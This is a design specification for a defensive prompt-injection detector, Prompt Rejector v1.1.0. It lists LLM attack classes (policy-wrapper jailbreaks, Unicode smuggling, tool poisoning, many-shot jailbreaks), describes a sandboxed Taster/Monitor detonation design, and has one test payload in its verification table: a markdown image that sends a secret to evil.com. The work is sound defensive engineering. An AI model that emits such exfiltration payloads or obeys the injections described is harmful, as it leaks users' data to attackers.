# SPEC.md — Prompt Rejector v1.1.0

**Status:** Draft for implementation
**Authoring date:** 2026-05-13
**Target release:** v1.1.0 (delta from v1.0.2)
**Companions:** [PLAN.md](PLAN.md), [RESEARCH_THREATS.md](RESEARCH_THREATS.md), [RESEARCH_FEEDS.md](RESEARCH_FEEDS.md)

---

## 1. Purpose

Prompt Rejector v1.0.2 ships solid classic-web detection (XSS, SQLi, shell injection, directory traversal, SSRF) plus a baseline vulnerability-feed pipeline pulling NVD CVE 2.0 + GitHub Advisories REST. Since v1.0.2 shipped, the active threat surface for AI agents has shifted decisively to **LLM-native and agentic attacks** that the current detector set does not cover. v1.1.0 closes that gap as a single coordinated release while preserving every existing capability.

The release is positioned as **defense-in-depth, not silver bullet** — a 2026 meta-study of 78 defense papers shows adaptive attacks still beat ~85% of state-of-the-art single defenses. v1.1.0 stacks five complementary signal sources: static patterns, semantic LLM analysis, taxonomy-tagged vulnerability feeds, behavioral lethal-trifecta analysis, and dynamic sandboxed detonation (Taste-Tester).

---

## 2. Threat model (delta from v1.0.0 release)

Confirmed 2025–2026 attack classes Prompt Rejector v1.0.2 cannot reliably catch today (see [RESEARCH_THREATS.md](RESEARCH_THREATS.md) for citations):

| Class | Example | v1.0.2 coverage | v1.1.0 target |
|---|---|---|---|
| Policy Puppetry (HiddenLayer, Apr 2025) | Fake INI/XML/JSON wrappers carrying `[policy]…` directives | None | Pass 2 |
| Unicode/ASCII smuggling (Sneaky Bits 2025) | Invisible instructions in U+E0000–E007F, zero-width, bidi | Partial (homoglyphs only) | Pass 1 |
| Indirect prompt injection in the wild | PayPal.me theft, recursive-delete via fetched content | None | Pass 3 |
| MCP tool poisoning (OWASP 2025) | Malicious tool descriptions persisting across sessions | None | Pass 4 |
| Lethal Trifecta (Willison 2025) | private-data read + untrusted fetch + egress | None | Pass 5 |
| Skill supply-chain attacks (Snyk ToxicSkills, Feb 2026 — 36% of 3,984 marketplace skills) | Backdoored SKILL.md | Partial (skill-threats.json static patterns) | Pass 4 + Pass 5 + HF feed |
| RAG/memory poisoning (MemoryGraft, MINJA, 84.3% ASR) | Persisted benign-artifact grafts | None | Pass 10 (canary tokens) |
| Many-shot / Crescendo jailbreaks | 100k+ token context floods, multi-turn escalation | None | Pass 12 |
| Multimodal typographic injection (up to 64% ASR on GPT-4V/Claude/Gemini) | Text rendered in images | Out of scope for v1.1 (no image OCR pipeline) | Deferred to v1.2 |
| AI-package CVEs (LiteLLM CVE-2026-42208 in KEV April 2026) | Vulnerable agent frameworks | Partial (CWE-79/89/78/22/918 filter misses AI CWEs) | Pass 6 + Pass 7 + Pass 9 |
| Agent runtime exploit (ClaudeBleed CVE-2026-2796, May 2026) [unverified in NVD] | Chrome-extension hijack of Claude-in-Chrome | None — out of scope (runtime, not prompt) | Documented only |

Out-of-scope for v1.1.0 (deferred): image/audio OCR, agent-runtime exploits, vendor-specific commercial signature feeds (Lakera Guard / HiddenLayer / Protect AI proprietary).

---

## 3. Architecture overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          MCP CLIENT (Claude, etc.)                      │
└────────────────────────────────┬────────────────────────────────────────┘
                                 │ stdio JSON-RPC
┌────────────────────────────────▼────────────────────────────────────────┐
│  mcpServer.ts — tool dispatcher                                         │
│  ┌────────────────────────────────────────────────────────────────┐    │
│  │  EXISTING TOOLS (v1.0.x — unchanged)                           │    │
│  │   check_prompt   scan_skill   list_patterns                    │    │
│  │   update_vuln_feeds   verify_pattern_integrity                 │    │
│  ├────────────────────────────────────────────────────────────────┤    │
│  │  NEW TOOLS (v1.1.0)                                            │    │
│  │   scan_mcp_tool   check_lethal_trifecta   query_cve            │    │
│  │   deploy_canary   verify_canary   taste_test                   │    │
│  └────────────────────────────────────────────────────────────────┘    │
└────┬────────┬────────┬────────┬────────┬────────┬────────┬─────────────┘
     │        │        │        │        │        │        │
┌────▼──┐ ┌───▼───┐ ┌──▼───┐ ┌──▼───┐ ┌──▼────┐ ┌─▼────┐ ┌─▼────────────┐
│Patter │ │Gemini │ │Skill │ │Vuln  │ │Trifec │ │Canar │ │TasteTester   │
│nServi │ │Servic │ │Scan  │ │Feed  │ │taAnal │ │ySvc  │ │Service (dual │
│ce     │ │e      │ │Svc   │ │Svc   │ │yzer   │ │      │ │ agent)       │
└───┬───┘ └───┬───┘ └──┬───┘ └──┬───┘ └───┬───┘ └──┬───┘ └─┬────────────┘
    │         │        │        │         │        │       │
    │         │        │        │         │        │       └─► Anthropic SDK (Taster + Monitor)
    │         │        │        │         │        │
    │         │        │        ▼         │        │
    │         │        │   ┌──────────────────────────────────────┐
    │         │        │   │ FEED LAYER (new in v1.1.0)           │
    │         │        │   │  NvdFeedService  (existing, retuned) │
    │         │        │   │  GhsaGraphQLService (new)            │
    │         │        │   │  OsvFeedService (new)                │
    │         │        │   │  AtlasService (new — taxonomy)       │
    │         │        │   │  KevFeedService (new — severity ↑)   │
    │         │        │   │  HuggingFaceService (new)            │
    │         │        │   └──────────┬───────────────────────────┘
    │         │        │              │
    ▼         ▼        ▼              ▼
┌─────────────────────────────────────────────┐
│  patterns/                                  │
│   xss.json, sqli.json, shell-injection.json│
│   prompt-injection.json, skill-threats.json│
│   unicode-smuggling.json   (new)            │
│   policy-puppetry.json     (new)            │
│   markdown-exfil.json      (new)            │
│   mcp-tool-poisoning.json  (new)            │
│   many-shot.json           (new)            │
│   llm-threats.json         (new — bundle)   │
│   manifest.json            (HMAC-signed)    │
│   staging/pending-review.json               │
│   canary-state.json        (new, HMAC)      │
└─────────────────────────────────────────────┘
```

### 3.1 Integration with existing dual-layer detection

Every new detector plugs into one of three existing extension points:
- **Static layer** → new `PatternEntry` rows in new pattern files. Discovered automatically by `PatternService.loadFromDirectory()`.
- **Semantic layer** → new categories appended to `GeminiService`'s system prompt and JSON schema.
- **Service layer** → new service classes invoked from `mcpServer.ts` tool handlers, following the existing dependency-injection style (`new Service(config)` in `index.ts`).

No changes to `PatternEntry` shape are mandatory; the optional new field `atlasTechnique?: string` is additive and ignored by v1.0 readers.

---

## 4. Tool catalog

### 4.1 Existing tools (preserved unchanged)

| Tool | Input | Output | Behavior |
|---|---|---|---|
| `check_prompt` | `{prompt}` | `SecurityReport` | Dual-layer scan; v1.1 adds new categories: `unicode_smuggling`, `policy_puppetry`, `markdown_exfil`, `many_shot`, `rag_poisoning` |
| `scan_skill` | `{skillContent}` | `SkillScanResult` | v1.1 adds: `hasLethalTrifecta`, `huggingFaceSecurityFlags[]` |
| `list_patterns` | `{category?, flagGroup?, scope?, enabled?}` | `PatternEntry[]` | Surfaces new categories; `atlasTechnique` field shown when set |
| `update_vuln_feeds` | `{lookbackDays?}` | feed summary | v1.1 adds OSV, GHSA-GraphQL, KEV, HF source attributions; per-source counts |
| `verify_pattern_integrity` | `{}` | `IntegrityCheckResult` | Validates expanded pattern set; canary-state.json also verified |

### 4.2 New tools (v1.1.0)

#### `scan_mcp_tool`
Detects MCP tool poisoning. Accepts a tool descriptor (name, description, input schema) and a known-good prior hash (optional).
```ts
input: { tool: McpToolDescriptor, priorHash?: string }
output: {
  hash: string,                // SHA-256 of canonicalized descriptor
  drift: boolean,              // true if hash != priorHash
  findings: Finding[],         // imperatives, hidden instructions, ATLAS tags
  severity: "safe"|"low"|"medium"|"high"|"critical"
}
```

#### `check_lethal_trifecta`
Static analysis of agent/skill capability set. Returns `critical` when all three are present.
```ts
input: { capabilities: string[] | skillContent: string }
output: {
  privateDataRead: { present: boolean, evidence: string[] },
  untrustedContentFetch: { present: boolean, evidence: string[] },
  externalEgress: { present: boolean, evidence: string[] },
  trifectaPresent: boolean,
  severity: "safe"|"medium"|"critical",
  recommendation: string
}
```

#### `query_cve`
Unified read across NVD + OSV + GHSA + KEV + ATLAS.
```ts
input: {
  keyword?: string,
  ecosystem?: "PyPI"|"npm"|"Go"|"Maven"|"NuGet"|"RubyGems"|"crates.io",
  atlasTechnique?: string,    // e.g. "AML.T0051"
  severity?: "low"|"medium"|"high"|"critical",
  inKev?: boolean,
  limit?: number              // default 50
}
output: {
  total: number,
  records: UnifiedCveRecord[]
}
```

#### `deploy_canary` + `verify_canary`
Memory/RAG poisoning detection via canary tokens.
```ts
deploy_canary:
  input: { context?: string, ttlSeconds?: number }
  output: { token: string, watchHandle: string, expiresAt: string }

verify_canary:
  input: { content: string, watchHandle?: string }
  output: { echoDetected: boolean, matches: string[], severity: "safe"|"critical" }
```

#### `taste_test` — dual-agent sandboxed dynamic detection
User-specified design. Run the suspect prompt through a *Taster* subagent that has only mock tools, and have a *Monitor* subagent grade the Taster's intended actions.

```ts
input: {
  prompt: string,
  mode?: "fast"|"thorough",     // fast = 1 turn, thorough = up to N turns
  context?: string              // optional system-prompt context to give Taster
}
output: {
  behaviorReport: {
    intents: Array<{
      action: string,           // "fetch_url", "read_file", "exec_shell", ...
      target: string,           // host, path, command
      severity: "safe"|"medium"|"high"|"critical",
      atlasTechniques: string[] // ATLAS technique IDs
    }>,
    monitorVerdict: "clean"|"suspicious"|"malicious",
    monitorRationale: string,
    severity: "safe"|"medium"|"high"|"critical"
  },
  tasterTranscript: TasterTurn[]  // for audit
}
```

Gating: behind `TASTE_TESTER_ENABLED=true` env flag because every call is an additional LLM round-trip with real cost.

---

## 5. Sandbox architecture — Taste-Tester

The Taste-Tester is the most novel and highest-risk subsystem in v1.1.0. It deserves its own design section.

### 5.1 Goal

Detonate suspect prompts in an isolated agent context and observe **intent** — what the model would have *tried* to do if it had real tools. This catches dynamic-only attacks (multi-turn Crescendo, conditional payloads, attacks contingent on tool responses) that static patterns and one-shot semantic analysis miss.

Analogy: malware sandbox (Cuckoo, ANY.RUN) detonates suspect binaries in an isolated VM and records syscalls. Taste-Tester is the LLM analogue.

### 5.2 Components

**Taster** — separate Anthropic SDK invocation (`@anthropic-ai/sdk`) running in the same Node process but isolated to its own conversation state. System prompt instructs the Taster to behave as a normal helpful assistant. Tool surface = **mock tools only**.

**Mock tool surface** (all return plausible synthetic results without performing the action):
- `fetch_url(url)` → returns synthetic 200 + boilerplate HTML; logs URL.
- `read_file(path)` → returns synthetic content matching plausible file types; logs path.
- `exec_shell(command)` → returns synthetic stdout; logs command.
- `send_email(to, subject, body)` → returns `"queued"`; logs recipients + payload.
- `transfer_funds(account, amount)` → returns `"queued"`; logs.
- `navigate_browser(url)` → returns synthetic page text; logs.
- `write_memory(key, value)` → returns `"ok"`; logs writes.
- `query_database(sql)` → returns synthetic rows; logs SQL.

The mock router is enforced at the SDK tool-callback layer — no real I/O reachable. The only output is the intent log.

**Monitor** — second separate SDK invocation, different system prompt (the "grader"). Receives the Taster's full transcript + intent log. Emits structured `BehaviorReport` JSON (zod-validated). Monitor cannot be reached by the Taster's output (one-way pipe).

### 5.3 Threat model for the Taste-Tester itself

| Threat | Mitigation |
|---|---|
| Taster I/O escapes sandbox | All tools are pure functions returning synthetic data; no `fs`, `net`, `child_process` imports in the mock router |
| Monitor is itself prompt-injected by Taster output | Monitor system prompt instructs to treat all Taster output as data; structured output (zod schema) constrains hallucination; Monitor cannot call tools |
| API cost runaway | Hard caps: `MAX_TASTER_TURNS` (default 5), `MAX_TASTER_TOKENS` per call (default 4096), `taste_test` gated behind `TASTE_TESTER_ENABLED` env flag |
| Latency | Streaming disabled for predictability; typical fast-mode call < 6s; thorough-mode < 30s |
| False positives (Taster declines benign tool use) | Monitor calibrated against benign + malicious labeled corpus; severity rubric requires *actionable* intent (e.g., specific attacker URL, sensitive path), not generic capability mention |

### 5.4 Configuration

```env
TASTE_TESTER_ENABLED=true              # opt-in gate
TASTE_TESTER_MODEL=claude-sonnet-4-6   # Taster + Monitor model
TASTE_TESTER_MAX_TURNS=5
TASTE_TESTER_MAX_TOKENS=4096
TASTE_TESTER_TIMEOUT_MS=30000
ANTHROPIC_API_KEY=...                  # required when enabled
```

---

## 6. Feed catalog (v1.1.0)

See [RESEARCH_FEEDS.md](RESEARCH_FEEDS.md) for full per-source fact-sheets.

| # | Source | Auth | Rate | LLM-filter strategy | Status |
|---|---|---|---|---|---|
| 1 | NVD CVE 2.0 | optional key | 5/30s anon, 50/30s key | Retune keywords to include `prompt injection`, `LLM`, `agent`, `RAG`, `MCP`; add CWE-502, CWE-1039 | Existing — retune in Pass 7 |
| 2 | GitHub Advisories (REST) | optional token | 5000/hr auth | Existing CWE loop | Existing — kept for fallback |
| 3 | GHSA GraphQL | token (recommended) | 5000/hr auth | `securityVulnerabilities(ecosystem: PIP)` + AI-package allowlist | New — Pass 6 |
| 4 | OSV.dev `/v1/querybatch` | none | unmetered (P95≤6s) | AI-package allowlist across PyPI/npm/Go | New — Pass 6 |
| 5 | MITRE ATLAS (stix bundle) | none | static file | Pull `dist/stix-atlas.json`; cache 24h | New — Pass 7 (taxonomy) |
| 6 | CISA KEV catalog | none | static daily JSON | Cross-reference all staged CVEs; severity escalator | New — Pass 7 |
| 7 | Hugging Face Hub | HF token | high | `securityStatus` for referenced models | New — Pass 8 |
| 8 | Garak probe corpus | none (OSS Apache 2.0) | clone-once | Adversarial regression corpus | New — Pass 3 + Pass 13 |
| 9 | OWASP LLM Top 10 2025 (curated JSON) | none | hand-curated | Static taxonomy reference | New — Pass 7 |

**Deliberately skipped:** MITRE cveawg (duplicates NVD); huntr.com (no public API); vendor security RSS (none publish structured feeds as of May 2026); exploit-db / packetstorm (irrelevant); AI Incident Database (narrative only, no signatures).

---

## 7. ATLAS taxonomy mapping

`PatternEntry` gains optional `atlasTechnique?: string` field (additive, v1.0 readers ignore).

Initial mapping for new categories:

| New pattern category | ATLAS technique |
|---|---|
| `unicode_smuggling` | AML.T0051 (LLM Prompt Injection) |
| `policy_puppetry` | AML.T0054 (LLM Jailbreak) |
| `markdown_exfil` | AML.T0024 (Exfiltration via AI Inference API) |
| `mcp_tool_poisoning` | AML.T0070 (Publish Poisoned AI Agent Tool) [Feb 2026 addition] |
| `many_shot` | AML.T0054 |
| `rag_poisoning` | AML.T0071 (AI Agent Context Poisoning) [Feb 2026 addition] |
| `lethal_trifecta` | AML.T0024 + AML.T0051 (composite) |

Surfaced in `check_prompt` and `scan_skill` outputs under `findings[].atlasTechnique`.

---

## 8. Data shapes

### 8.1 `PatternEntry` (extended)

```ts
type PatternEntry = {
  id: string;
  name: string;
  pattern: string;             // regex source
  flags: string;
  scope: "general" | "skill";
  category: string;            // adds: unicode_smuggling, policy_puppetry,
                               //        markdown_exfil, mcp_tool_poisoning,
                               //        many_shot, rag_poisoning
  flagGroup: string;
  severity: "low" | "medium" | "high" | "critical";
  detection: {
    mode: "simple" | "threshold";
    countThreshold?: number;
    singleMatchLength?: number;
  };
  enabled: boolean;
  description: string;
  atlasTechnique?: string;     // NEW (optional)
  source?: {                   // NEW (optional, provenance)
    license: "Apache-2.0" | "MIT" | "CC-BY-4.0" | "in-house";
    upstream?: string;         // e.g. "garak/probes/promptinject.py"
  };
};
```

### 8.2 `UnifiedCveRecord` (new)

```ts
type UnifiedCveRecord = {
  cveId: string;
  sources: Array<"nvd" | "osv" | "ghsa" | "kev" | "atlas">;
  title: string;
  description: string;
  severity: "low" | "medium" | "high" | "critical";
  cvss?: number;
  ecosystem?: string;
  affectedPackages: Array<{ name: string; versions: string }>;
  cweIds: string[];
  atlasTechniques: string[];
  inKev: boolean;              // if true → severity escalated by one level
  publishedAt: string;
  lastModifiedAt: string;
  references: string[];
};
```

### 8.3 `BehaviorReport` (new — Taste-Tester)

See §4.2 `taste_test`.

---

## 9. Configuration surface

New env vars introduced in v1.1.0:

```env
# Feeds
GITHUB_TOKEN=...                  # also used for GHSA GraphQL (existing)
HF_TOKEN=...                      # Hugging Face Hub security signals
KEV_REFRESH_INTERVAL_HOURS=24
ATLAS_REFRESH_INTERVAL_HOURS=168

# Taste-Tester
TASTE_TESTER_ENABLED=false        # opt-in
TASTE_TESTER_MODEL=claude-sonnet-4-6
TASTE_TESTER_MAX_TURNS=5
TASTE_TESTER_MAX_TOKENS=4096
TASTE_TESTER_TIMEOUT_MS=30000
ANTHROPIC_API_KEY=...

# Canary
CANARY_HMAC_SECRET=...            # falls back to PATTERN_INTEGRITY_SECRET if unset
CANARY_DEFAULT_TTL_SECONDS=86400
```

All new env vars are **optional with safe defaults**; missing keys gracefully degrade (the relevant tool returns `{available: false, reason: "missing config"}`).

---

## 10. Integrity & supply-chain considerations

- `patterns/manifest.json` regenerated after every pass that adds a pattern file. HMAC re-signed with `PATTERN_INTEGRITY_SECRET`.
- New pattern files contribute to root-hash computation. `verify_pattern_integrity` covers all of them automatically.
- `patterns/canary-state.json` HMAC-signed separately (uses `CANARY_HMAC_SECRET` or falls back to `PATTERN_INTEGRITY_SECRET`).
- ATLAS / KEV / OSV / GHSA / HF feed caches written to `patterns/feed-cache/` (gitignored). Cache files include source URL, fetch timestamp, and SHA-256 of payload for tamper detection.
- All upstream pattern sources tracked in `PatternEntry.source` field with explicit license; vendor proprietary corpora rejected at PR review.

---

## 11. Verification matrix

| Capability | Verification | Pass |
|---|---|---|
| Stub surface reachable | `npm test` green; MCP tools each return `{stub:true}` | 0 |
| Unicode-tag payload caught | `check_prompt("DROP TABLE\u{e0044}…")` → `critical`, category `unicode_smuggling` | 1 |
| Policy-puppetry payload caught | HiddenLayer fake-INI sample → `critical`, category `policy_puppetry` | 2 |
| Markdown-image exfil caught | `![](https://evil.com/?x=secret)` → `critical` | 3 |
| MCP tool poisoning caught | OWASP MCP poisoning sample → `flagged` with diff vs prior hash | 4 |
| Lethal-trifecta detected | 3-of-3 capabilities → `critical`; any 2-of-3 → `medium` | 5 |
| OSV + GHSA-GraphQL contribute | `update_vuln_feeds` returns per-source counts > 0 for both | 6 |
| ATLAS tags appear in findings | One existing pattern returns `atlasTechnique: "AML.T0051"` | 7 |
| KEV escalates severity | CVE-2026-42208 (LiteLLM) staged with `severity: critical, inKev: true` | 7 |
| HF security flags surfaced | Skill referencing a known unsafe-serialization-flagged model → flagged | 8 |
| `query_cve` returns merged records | `query_cve({keyword:"prompt injection"})` returns N≥3 unified records | 9 |
| Canary echo detected | Issue → embed → verify → `echoDetected: true, severity: critical` | 10 |
| Taste-Tester catches indirect injection | Known payload → `monitorVerdict: malicious`, `would_have_egressed_to:<host>` | 11 |
| Many-shot stack flagged | 50-pair synthetic Q&A + divergent tail → `category: many_shot, severity: high` | 12 |
| Adversarial regression baseline | Garak subset detection rate recorded in CHANGELOG | 13 |

---

## 12. Non-goals for v1.1.0

- Image/audio OCR for multimodal typographic injection (deferred to v1.2).
- Agent-runtime exploit detection (ClaudeBleed-class) — out of project scope; runtime, not prompt.
- Vendor commercial signature licensing (Lakera / HiddenLayer / Protect AI).
- Real-time streaming detection — current request/response model is sufficient.
- Replacement of Gemini as semantic backend — pluggable boundary deferred.

---

## 13. Open questions / explicit uncertainties

Tracked here so reviewers can challenge before implementation:

1. **CVE-2026-2796 (ClaudeBleed)** — Anthropic acknowledged on red.anthropic.com but NVD entry not yet confirmed at authoring time. Treat as `[unverified]` in user-facing docs.
2. **MemoryGraft arXiv ID `2512.16962`** — arXiv IDs ≥ 2510 require verification; cited in research but unconfirmed.
3. **OWASP LLM Top 10 2026** — still draft as of May 2026; v2025 is operative. SPEC references 2025.
4. **ATLAS technique IDs** for the Feb 2026 additions (AI Agent Context Poisoning, Publish Poisoned AI Agent Tool) — IDs `AML.T0070` and `AML.T0071` cited; **must be confirmed against the live ATLAS bundle in Pass 7**. If different, all `atlasTechnique` references in pattern files must be updated.
5. **Taster cost ceiling** — `MAX_TURNS=5` is a guess. Calibrate against a labeled corpus in Pass 11b and adjust.

---

## 14. Glossary

| Term | Definition |
|---|---|
| Lethal Trifecta | Willison's pattern: agent has private-data read + untrusted-content fetch + external egress → exfil exploitable |
| Policy Puppetry | HiddenLayer's universal jailbreak via fake policy-document wrappers |
| ATLAS | MITRE's Adversarial Threat Landscape for AI Systems taxonomy |
| KEV | CISA's Known Exploited Vulnerabilities catalog |
| MCP tool poisoning | Malicious instructions embedded in MCP tool descriptions |
| Canary token | Synthetic unique string planted in context; echoes back when memory/RAG poisoned |
| Taste-Tester | This project's dual-agent sandbox detonator (Taster + Monitor) |
| Crescendo / many-shot | Multi-turn or context-saturation jailbreaks |
